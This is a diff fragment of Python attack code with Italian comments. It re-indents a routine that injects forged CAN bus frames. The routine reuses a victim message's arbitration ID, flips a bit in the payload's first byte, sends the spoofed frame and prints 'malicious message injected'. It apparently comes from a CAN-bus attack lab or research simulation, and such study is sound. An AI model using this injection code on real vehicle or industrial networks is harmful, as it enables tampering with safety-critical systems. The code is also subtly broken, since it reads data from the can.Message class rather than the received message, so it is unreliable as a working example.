@@ -226,24 +226,23 @@ def start_attacker_dynamic():
         # Iniezione del messaggio malevolo (stesso ID e payload Dominante)
 
         try:
-                # Copia i dati originali
-                data = bytearray((can.Message).data)
+            # Copia i dati originali
+            data = bytearray((can.Message).data)
 
-                # Esempio: applichi il bit-flip al primo byte
-                # (puoi cambiare indice se ti interessa un altro byte)
-                data[0] = flip_first_one_from_left(data[0])
-
-                # Crei il frame "attaccante" con stesso ID ma data corrotta
-                att_msg = can.Message(
+            # Esempio: applichi il bit-flip al primo byte
+            # (puoi cambiare indice se ti interessa un altro byte)
+            data[0] = flip_first_one_from_left(data[0])
+           # Crei il frame "attaccante" con stesso ID ma data corrotta
+            att_msg = can.Message( 
                 arbitration_id=msg.arbitration_id,
                 data=data,
                 is_extended_id=msg.is_extended_id
-                )
+            )
 
-                print(f"[ATT] vittima={msg.data.hex().upper()}  →  attaccante={att_msg.data.hex().upper()}")
-                bus.send(att_msg)
+            print(f"[ATT] vittima={msg.data.hex().upper()}  →  attaccante={att_msg.data.hex().upper()}")
+            bus.send(att_msg)
 
-        print(f"💣 [Attaccante] Messaggio malevolo iniettato.")
+            print(f"💣 [Attaccante] Messaggio malevolo iniettato.")
 
             
 
